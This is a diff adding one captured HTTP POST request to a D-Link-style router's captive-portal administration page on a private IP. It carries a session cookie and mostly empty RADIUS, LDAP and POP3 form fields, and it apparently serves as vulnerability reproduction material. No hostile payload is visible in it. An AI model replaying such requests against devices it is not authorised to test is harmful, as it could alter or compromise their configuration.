@@ -1,0 +1,16 @@
+POST /adv_captivals.php HTTP/1.1
+Host: 192.168.33.132:33165
+Content-Length: 807
+Cache-Control: max-age=0
+Upgrade-Insecure-Requests: 1
+Origin: http://192.168.33.132:33165
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.110 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.33.132:33165/adv_captivals.php
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Cookie: dlink_uid=czyrtqhrhw
+Connection: close
+
+ACTION_POST=adv_captivals&f_filter_ip1=&f_filter_ip2=&f_filter_ip3=&f_filter_ip4=&f_filter_mask1=&f_filter_mask2=&f_filter_mask3=&f_filter_mask4=&which_delete=&which_edit=&f_action=add_s&random_s1=7Xys7ZqM&random_s2=&random_s3=&random_s4=&random_s5=&random_s6=&random_s7=&random_s8=&random_s9=&random_s10=&random_s11=&random_s12=&random_s13=&random_s14=&random_s15=&random_s16=&random_s17=&random_s18=&random_s19=&random_s20=&end_date=2014-01-01&encry_type=7&serial_cnt=1&duration=111&end_year=2014&end_month=1&end_day=1&device=11&filter1=&filter2=&filter3=&filter4=&r_name=&r_password=&r_group=manager&radius_ip=&radius_port=1812&radius_sec=&acc_mode=0&acc_ip=&acc_port=1813&acc_sec=&ldap_ip=&ldap_port=389&ldap_auth=0&ldap_name=&ldap_password=&base_dn=&attribute=&identity=&pop3_ip=&pop3_port=&ssl_state=0
